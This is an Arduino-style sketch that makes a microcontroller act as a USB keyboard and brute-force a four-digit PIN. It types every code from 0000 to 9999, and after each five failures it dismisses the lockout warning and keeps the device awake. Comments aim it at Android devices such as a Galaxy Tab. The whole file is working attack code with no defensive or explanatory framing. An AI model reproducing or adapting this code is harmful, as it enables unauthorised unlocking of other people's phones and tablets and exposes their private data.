void pT(char* password)
{
  delay(150);
  int j;
  for (j = 0 ; j < strlen(password) ; j++)
  {
    Keyboard.print(password[j]);
    delay(100);
  }
  delay(150);
  Keyboard.press(KEY_RETURN);
  delay(50);
  Keyboard.releaseAll();

  delay(150);
}

void enterKey()
{
  Keyboard.press(KEY_RETURN);
  delay(50);
  Keyboard.releaseAll();
}

/*void getFocus()
{
  int i;
  for (i=0; i<10;i++)
  {
    Keyboard.set_key1(KEY_TAB );
    Keyboard.send_now();
            
    Keyboard.set_key1(0);
    Keyboard.send_now(); 
  }
}*/

void setup() {
  Keyboard.begin();
  delay(1000);
}

void loop() {
delay(500);
int i;
int j;
int k;
int l;

int keepalive;

String pincodeString;
char pincodeChar[5];
int attempt = 0;

for (i=0 ; i<10; i++)
  for (j=0; j<10; j++)
    for (k=0; k<10; k++)
      for (l=0; l<10; l++)
      {
        pincodeString = String(i) + String(j) + String(k) + String(l);
        pincodeString.toCharArray(pincodeChar, 5);
        pT(pincodeChar);
        attempt ++;
        if (attempt == 5)
        {
          //Type enter to close warning box
          delay(200);
          enterKey();
          
          //Type enter every 5 second to keep android alive
          for (keepalive = 0 ; keepalive < 30 ; keepalive++)
          {
            delay(1000);
            enterKey();  
          }
     
          //wait more
          delay(100);
          enterKey();
          //For galaxy tab not for ...
          //getFocus();
          
          
          attempt = 0;
        }
      }
while(1){}

}
